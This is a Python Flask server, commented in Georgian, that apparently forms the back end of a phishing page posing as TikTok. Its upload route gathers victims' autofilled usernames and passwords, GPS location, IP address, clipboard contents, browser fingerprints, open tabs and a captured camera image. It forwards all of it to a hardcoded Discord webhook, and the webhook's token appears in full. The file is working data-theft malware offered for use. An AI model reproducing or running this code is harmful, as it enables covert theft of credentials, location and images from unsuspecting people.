from flask import Flask, request, render_template
from flask_cors import CORS
import requests
import base64
import os

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1571037523944144916/M166376XMNczFiKd5_afTR2wCx9XQ1UNdtq7n4vGjAuP5MNtM8cBxnWHpbHb5OVX28Bz")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/upload_data', methods=['POST'])
def upload_data():
    try:
        data = request.json
        secret = data.get('secret', {})
        
        # ლოკაცია
        if secret.get('lat') and secret['lat'] != "უარი":
            maps_link = f"https://www.google.com/maps?q={secret['lat']},{secret['lon']}"
            location_text = f"📍 **ლოკაცია:** [დააჭირე რუკის საჩვენებლად]({maps_link})"
        else:
            location_text = "📍 **ლოკაცია:** მომხმარებელმა უარი თქვა"

        # ტექსტური ინფო
        content = f"🚨 **ახალი მონაცემი! (TikTok Direct)**\n\n{location_text}\n\n💻 **მოწყობილობა:**\n• **ბრაუზერი:** `{secret.get('userAgent', 'უცნობია')}`\n• **ეკრანი:** `{secret.get('screen', 'უცნობია')}`\n• **RAM:** `{secret.get('ram', 'უცნობია')}`\n"
        
        # ავტოშევსება
        content += f"\n🔑 **ავტოშევსება:**\n• **იუზერი:** `{secret.get('autofilledUser', 'ვერ წაიკითხა')}`\n• **პაროლი:** `{secret.get('autofilledPass', 'ვერ წაიკითხა')}`\n"
        
        # საიდუმლო ინფო
        content += f"\n🕵️‍♂️ **საიდუმლო:**\n• **IP:** `{secret.get('ip', 'უცნობია')}`\n• **ხმის ანაბეჭდი:** `{secret.get('audioFingerprint', 'უცნობია')}`\n• **ფონტები:** `{secret.get('fonts', 'უცნობია')}`\n• **კლიპბორდი:** `{secret.get('clipboard', 'უცნობია')}`\n• **ბატარეა:** `{secret.get('battery', 'უცნობია')}`\n• **ინტერნეტი:** `{secret.get('network', 'უცნობია')}`\n• **ტაბები:** `{secret.get('tabs', 'უცნობია')}`\n• **ორიენტაცია:** `{secret.get('orientation', 'უცნობია')}`\n• **ვიბრაცია:** `{secret.get('vibrated', 'არა')}`"

        # გაგზავნა
        requests.post(DISCORD_WEBHOOK_URL, json={"content": content})

        # ფოტოს გაგზავნა
        if secret.get('image'):
            image_data = secret['image'].replace("data:image/png;base64,", "")
            image_bytes = base64.b64decode(image_data)
            requests.post(DISCORD_WEBHOOK_URL, files={"file": ("foto.png", image_bytes, "image/png")})

        return "წარმატება"
    except Exception as e:
        print(f"❌ შეცდომა: {e}")
        return "შეცდომა"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
